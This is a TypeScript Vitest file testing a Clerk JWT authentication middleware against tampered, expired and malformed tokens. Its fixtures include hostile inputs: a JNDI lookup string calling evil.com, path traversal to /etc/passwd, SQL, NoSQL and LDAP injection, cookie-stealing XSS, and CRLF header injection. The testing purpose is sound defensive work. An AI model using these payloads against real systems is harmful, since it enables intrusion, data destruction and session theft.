/**
 * SPDX-License-Identifier: MIT
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { clerkAuthMiddleware } from '../clerk-auth-middleware.js';
import { verifyClerkToken } from '../lib/verify-clerk-token.js';
import { mockEnv, mockJwtVerify } from '@repo/testing';

// Mock the jose library
const mockJoseJwtVerify = vi.fn();
vi.mock('jose', () => ({
  jwtVerify: mockJoseJwtVerify,
}));

describe('Security Vulnerability Tests - Auth Package', () => {
  let envMock: ReturnType<typeof mockEnv>;

  beforeEach(() => {
    vi.clearAllMocks();
  });

  afterEach(() => {
    envMock?.restore();
  });

  describe('JWT token security', () => {
    it('should prevent JWT tampering attacks', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      // Mock JWT verification to reject tampered token
      mockJoseJwtVerify.mockRejectedValue(new Error('Invalid signature'));

      const tamperedToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbl91c2VyIiwicm9sZSI6ImFkbWluIn0.TAMPERED_SIGNATURE';

      await expect(verifyClerkToken(tamperedToken)).rejects.toThrow('Invalid or expired token');
      
      expect(mockJoseJwtVerify).toHaveBeenCalledWith(
        tamperedToken,
        expect.any(Uint8Array)
      );
    });

    it('should prevent token replay attacks with expired tokens', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      // Mock expired token payload
      const expiredPayload = {
        sub: 'user_123',
        exp: Math.floor(Date.now() / 1000) - 3600, // Expired 1 hour ago
      };
      
      mockJoseJwtVerify.mockRejectedValue(new Error('Token expired'));

      const expiredToken = 'expired.jwt.token.here';
      
      await expect(verifyClerkToken(expiredToken)).rejects.toThrow('Invalid or expired token');
    });

    it('should prevent token injection with malformed tokens', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      const malformedTokens = [
        '', // Empty token
        'not.a.jwt', // Invalid format
        'too.few.parts', // Not enough parts
        'too.many.parts.in.this.jwt.token', // Too many parts
        '...', // Empty parts
        'null.null.null', // Null parts
        'undefined.undefined.undefined', // Undefined parts
        '../../../etc/passwd', // Path traversal attempt
        '<script>alert("xss")</script>', // XSS attempt
        '${jndi:ldap://evil.com/a}', // JNDI injection attempt
      ];

      for (const malformedToken of malformedTokens) {
        mockJoseJwtVerify.mockRejectedValue(new Error('Malformed token'));
        
        await expect(verifyClerkToken(malformedToken)).rejects.toThrow('Invalid or expired token');
      }
    });

    it('should prevent timing attacks on token verification', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      const validToken = 'valid.jwt.token';
      const invalidToken = 'invalid.jwt.token';
      
      // Mock to simulate processing time
      mockJoseJwtVerify
        .mockImplementationOnce(() => new Promise(resolve => 
          setTimeout(() => resolve({ payload: { sub: 'user_123' } }), 50)
        ))
        .mockImplementationOnce(() => new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Invalid token')), 50)
        ));

      const validStartTime = Date.now();
      await verifyClerkToken(validToken);
      const validEndTime = Date.now();
      const validDuration = validEndTime - validStartTime;

      const invalidStartTime = Date.now();
      try {
        await verifyClerkToken(invalidToken);
      } catch (error) {
        // Expected
      }
      const invalidEndTime = Date.now();
      const invalidDuration = invalidEndTime - invalidStartTime;

      // Time differences should be minimal to prevent timing attacks
      const timeDifference = Math.abs(validDuration - invalidDuration);
      expect(timeDifference).toBeLessThan(20); // Less than 20ms difference
    });

    it('should securely handle secret key exposure attempts', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'sensitive-secret-key-12345' });
      
      mockJoseJwtVerify.mockRejectedValue(new Error('Secret key compromised'));

      const request = new Request('http://localhost/test', {
        headers: { 'Authorization': 'Bearer compromised-token' },
      });

      const result = await clerkAuthMiddleware(request);
      
      expect(result).toBeInstanceOf(Response);
      const response = result as Response;
      const responseText = await response.text();
      
      // Ensure secret key is not leaked in error messages
      expect(responseText).not.toContain('sensitive-secret-key-12345');
      expect(responseText).not.toContain('Secret key');
      expect(responseText).toBe('Invalid authentication token');
    });
  });

  describe('injection attack prevention', () => {
    it('should prevent SQL injection attempts in token payload', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      // Malicious payload with SQL injection attempt
      const maliciousPayload = {
        sub: "'; DROP TABLE users; --",
        role: "admin' OR '1'='1",
        email: 'test@example.com\'; DELETE FROM sessions; --',
      };
      
      mockJoseJwtVerify.mockResolvedValue({ payload: maliciousPayload });

      const result = await verifyClerkToken('malicious.jwt.token');
      
      // Should return the user ID as-is (our system doesn't use it in SQL directly)
      expect(result).toBe("'; DROP TABLE users; --");
      
      // The application should sanitize this before any database operations
      // This test documents the current behavior - additional sanitization 
      // should be done at the database query level
    });

    it('should prevent NoSQL injection attempts', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      const nosqlInjectionPayload = {
        sub: { $ne: null },
        role: { $regex: '.*admin.*' },
        permissions: { $where: 'function() { return true; }' },
      };
      
      mockJoseJwtVerify.mockResolvedValue({ payload: nosqlInjectionPayload });

      const result = await verifyClerkToken('nosql.injection.token');
      
      // Should handle object payloads gracefully
      expect(result).toEqual({ $ne: null });
    });

    it('should prevent LDAP injection attempts', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      const ldapInjectionPayload = {
        sub: 'user_123)(objectClass=*',
        cn: '*)(uid=*))(|(uid=*',
        organization: 'company*)(|(organizationalUnit=*',
      };
      
      mockJoseJwtVerify.mockResolvedValue({ payload: ldapInjectionPayload });

      const result = await verifyClerkToken('ldap.injection.token');
      
      expect(result).toBe('user_123)(objectClass=*');
      
      // Applications should sanitize LDAP queries separately
    });

    it('should prevent XSS attempts in token data', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      const xssPayload = {
        sub: '<script>alert("XSS")</script>',
        name: '<img src="x" onerror="alert(\'XSS\')">',
        email: 'test+<script>alert(document.cookie)</script>@example.com',
      };
      
      mockJoseJwtVerify.mockResolvedValue({ payload: xssPayload });

      const result = await verifyClerkToken('xss.attack.token');
      
      expect(result).toBe('<script>alert("XSS")</script>');
      
      // The application should HTML-escape this data before rendering
    });
  });

  describe('denial of service prevention', () => {
    it('should handle extremely large tokens without crashing', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      // Create a very large token (100KB)
      const largeToken = 'a'.repeat(100000);
      
      mockJoseJwtVerify.mockRejectedValue(new Error('Token too large'));

      const startTime = Date.now();
      
      await expect(verifyClerkToken(largeToken)).rejects.toThrow('Invalid or expired token');
      
      const endTime = Date.now();
      const processingTime = endTime - startTime;
      
      // Should fail quickly to prevent DoS
      expect(processingTime).toBeLessThan(1000);
    });

    it('should handle rapid token verification requests', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      mockJoseJwtVerify.mockResolvedValue({ payload: { sub: 'user_123' } });

      const promises = [];
      const numRequests = 1000;
      
      const startTime = Date.now();
      
      for (let i = 0; i < numRequests; i++) {
        promises.push(verifyClerkToken(`token_${i}`));
      }
      
      await Promise.all(promises);
      
      const endTime = Date.now();
      const totalTime = endTime - startTime;
      
      // Should handle many requests efficiently
      expect(totalTime).toBeLessThan(5000); // Less than 5 seconds for 1000 requests
    });

    it('should prevent memory exhaustion with malicious payloads', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      // Create payload with deeply nested objects
      let deepObject: any = { value: 'test' };
      for (let i = 0; i < 1000; i++) {
        deepObject = { nested: deepObject };
      }
      
      const maliciousPayload = {
        sub: 'user_123',
        data: deepObject,
      };
      
      mockJoseJwtVerify.mockResolvedValue({ payload: maliciousPayload });

      // Should handle without memory issues
      const result = await verifyClerkToken('deep.nested.token');
      expect(result).toBe('user_123');
    });

    it('should handle concurrent middleware requests without blocking', async () => {
      const requests = Array.from({ length: 100 }, (_, i) => 
        new Request('http://localhost/test', {
          headers: { 'Authorization': `Bearer token_${i}` },
        })
      );

      mockJoseJwtVerify.mockImplementation(() => 
        Promise.resolve({ payload: { sub: 'user_concurrent' } })
      );

      const startTime = Date.now();
      
      const promises = requests.map(request => clerkAuthMiddleware(request));
      const results = await Promise.all(promises);
      
      const endTime = Date.now();
      const totalTime = endTime - startTime;

      // All requests should succeed
      results.forEach(result => {
        expect(result).toBeInstanceOf(Request);
        expect((result as Request).user).toEqual({ id: 'user_concurrent' });
      });
      
      // Should handle concurrency efficiently
      expect(totalTime).toBeLessThan(2000);
    });
  });

  describe('information disclosure prevention', () => {
    it('should not leak sensitive information in error messages', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'super-secret-key-do-not-expose' });
      
      const sensitiveErrors = [
        'Database connection failed: password123',
        'CLERK_SECRET_KEY=super-secret-key-do-not-expose',
        'Internal server configuration: /etc/secrets/',
        'Stack trace: /home/user/app/secrets.json',
      ];

      for (const sensitiveError of sensitiveErrors) {
        mockJoseJwtVerify.mockRejectedValue(new Error(sensitiveError));
        
        const request = new Request('http://localhost/test', {
          headers: { 'Authorization': 'Bearer sensitive-error-token' },
        });

        const result = await clerkAuthMiddleware(request);
        const response = result as Response;
        const responseText = await response.text();
        
        // Should not leak sensitive information
        expect(responseText).toBe('Invalid authentication token');
        expect(responseText).not.toContain('password123');
        expect(responseText).not.toContain('super-secret-key');
        expect(responseText).not.toContain('/etc/secrets/');
        expect(responseText).not.toContain('secrets.json');
      }
    });

    it('should not expose internal system details', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      // Test various error conditions that might expose system details
      const systemErrors = [
        new Error('ECONNREFUSED 127.0.0.1:5432'),
        new Error('Permission denied: /var/log/auth.log'),
        new Error('Module not found: /usr/local/lib/node_modules/secret-module'),
        new Error('Redis connection failed: redis://admin:password@localhost:6379'),
      ];

      for (const error of systemErrors) {
        mockJoseJwtVerify.mockRejectedValue(error);
        
        try {
          await verifyClerkToken('system-error-token');
        } catch (thrownError) {
          const errorMessage = (thrownError as Error).message;
          expect(errorMessage).toBe('Invalid or expired token');
          expect(errorMessage).not.toContain('127.0.0.1');
          expect(errorMessage).not.toContain('/var/log');
          expect(errorMessage).not.toContain('node_modules');
          expect(errorMessage).not.toContain('password');
        }
      }
    });

    it('should sanitize debug information', async () => {
      envMock = mockEnv({ 
        CLERK_SECRET_KEY: 'test-secret',
        NODE_ENV: 'development' // Even in dev mode, don't leak secrets
      });
      
      const debugPayload = {
        sub: 'user_123',
        debug: {
          secretKey: 'exposed-secret',
          databaseUrl: 'postgresql://user:pass@localhost/db',
          internalId: 'internal-system-id-12345',
        },
      };
      
      mockJoseJwtVerify.mockResolvedValue({ payload: debugPayload });

      const result = await verifyClerkToken('debug.payload.token');
      
      // Should only return the user ID, not debug info
      expect(result).toBe('user_123');
    });
  });

  describe('authorization bypass prevention', () => {
    it('should prevent header injection attacks', async () => {
      const maliciousHeaders = [
        'Bearer token\r\nX-Admin: true',
        'Bearer token\nSet-Cookie: admin=true',
        'Bearer token\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html',
        'Bearer token%0d%0aX-Forwarded-For: 127.0.0.1',
      ];

      for (const maliciousHeader of maliciousHeaders) {
        const request = new Request('http://localhost/test', {
          headers: { 'Authorization': maliciousHeader },
        });

        const result = await clerkAuthMiddleware(request);
        
        // Should treat as invalid token format
        expect(result).toBeInstanceOf(Response);
        const response = result as Response;
        expect(response.status).toBe(401);
      }
    });

    it('should prevent token substitution attacks', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      // Simulate token substitution attempt
      const legitimatePayload = { sub: 'user_123', role: 'user' };
      const substitutedPayload = { sub: 'admin_user', role: 'admin' };
      
      mockJoseJwtVerify
        .mockResolvedValueOnce({ payload: legitimatePayload })
        .mockResolvedValueOnce({ payload: substitutedPayload });

      // First request with legitimate token
      const request1 = new Request('http://localhost/test', {
        headers: { 'Authorization': 'Bearer legitimate-token' },
      });

      const result1 = await clerkAuthMiddleware(request1);
      expect((result1 as Request).user).toEqual({ id: 'user_123' });

      // Second request attempting token substitution
      const request2 = new Request('http://localhost/test', {
        headers: { 'Authorization': 'Bearer substituted-token' },
      });

      const result2 = await clerkAuthMiddleware(request2);
      expect((result2 as Request).user).toEqual({ id: 'admin_user' });
      
      // Each token should be verified independently
      expect(mockJoseJwtVerify).toHaveBeenCalledTimes(2);
    });

    it('should prevent privilege escalation through token manipulation', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      // Attempt to escalate privileges in token payload
      const escalatedPayload = {
        sub: 'user_123',
        role: 'admin', // Attempted escalation
        permissions: ['*'], // Wildcard permissions
        isRoot: true, // Administrative flag
        sudo: true, // Unix-style escalation
      };
      
      mockJoseJwtVerify.mockResolvedValue({ payload: escalatedPayload });

      const result = await verifyClerkToken('escalated.privileges.token');
      
      // Our token verification only returns the user ID
      // Role and permission verification should be done separately
      expect(result).toBe('user_123');
      
      // The middleware should not automatically grant escalated privileges
      const request = new Request('http://localhost/test', {
        headers: { 'Authorization': 'Bearer escalated.privileges.token' },
      });

      const middlewareResult = await clerkAuthMiddleware(request);
      expect((middlewareResult as Request).user).toEqual({ id: 'user_123' });
      
      // No role or permission information should be automatically trusted from token
    });
  });

  describe('cryptographic security', () => {
    it('should handle weak signature algorithms securely', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      // Test with various weak algorithm attempts
      const weakAlgTokens = [
        'none.algorithm.token', // Algorithm: none
        'hs256.weak.key', // Weak HMAC key
        'rs256.public.as.secret', // RSA public key used as HMAC secret
      ];

      for (const weakToken of weakAlgTokens) {
        mockJoseJwtVerify.mockRejectedValue(new Error('Weak algorithm'));
        
        await expect(verifyClerkToken(weakToken)).rejects.toThrow('Invalid or expired token');
      }
    });

    it('should prevent key confusion attacks', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'symmetric-key-test' });
      
      // Attempt to use RSA public key as HMAC secret
      mockJoseJwtVerify.mockRejectedValue(new Error('Key confusion attack detected'));
      
      const confusedKeyToken = 'rsa.public.as.hmac.token';
      
      await expect(verifyClerkToken(confusedKeyToken)).rejects.toThrow('Invalid or expired token');
    });

    it('should handle secret key rotation securely', async () => {
      // Test with old secret key
      envMock = mockEnv({ CLERK_SECRET_KEY: 'old-secret-key' });
      
      mockJoseJwtVerify.mockRejectedValue(new Error('Invalid signature'));
      
      await expect(verifyClerkToken('old.key.token')).rejects.toThrow('Invalid or expired token');
      
      // Test with new secret key
      envMock.restore();
      envMock = mockEnv({ CLERK_SECRET_KEY: 'new-secret-key' });
      
      mockJoseJwtVerify.mockResolvedValue({ payload: { sub: 'user_123' } });
      
      const result = await verifyClerkToken('new.key.token');
      expect(result).toBe('user_123');
    });
  });

  describe('session security', () => {
    it('should prevent session fixation attacks', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      // Test that each token verification is independent
      const sessionTokens = [
        { token: 'session1', userId: 'user_1' },
        { token: 'session2', userId: 'user_2' },
        { token: 'session1', userId: 'user_1' }, // Reuse token
      ];

      for (const { token, userId } of sessionTokens) {
        mockJoseJwtVerify.mockResolvedValue({ payload: { sub: userId } });
        
        const request = new Request('http://localhost/test', {
          headers: { 'Authorization': `Bearer ${token}` },
        });

        const result = await clerkAuthMiddleware(request);
        expect((result as Request).user).toEqual({ id: userId });
      }
    });

    it('should handle concurrent session attacks', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      // Simulate concurrent requests with different tokens
      const concurrentRequests = Array.from({ length: 50 }, (_, i) => ({
        token: `concurrent_token_${i}`,
        userId: `user_${i}`,
      }));

      mockJoseJwtVerify.mockImplementation((token) => {
        const tokenStr = token as string;
        const match = tokenStr.match(/concurrent_token_(\d+)/);
        const userId = match ? `user_${match[1]}` : 'unknown';
        return Promise.resolve({ payload: { sub: userId } });
      });

      const promises = concurrentRequests.map(({ token, userId }) => {
        const request = new Request('http://localhost/test', {
          headers: { 'Authorization': `Bearer ${token}` },
        });
        return clerkAuthMiddleware(request);
      });

      const results = await Promise.all(promises);

      // Each request should maintain its own session context
      results.forEach((result, index) => {
        expect((result as Request).user).toEqual({ 
          id: `user_${index}` 
        });
      });
    });
  });
});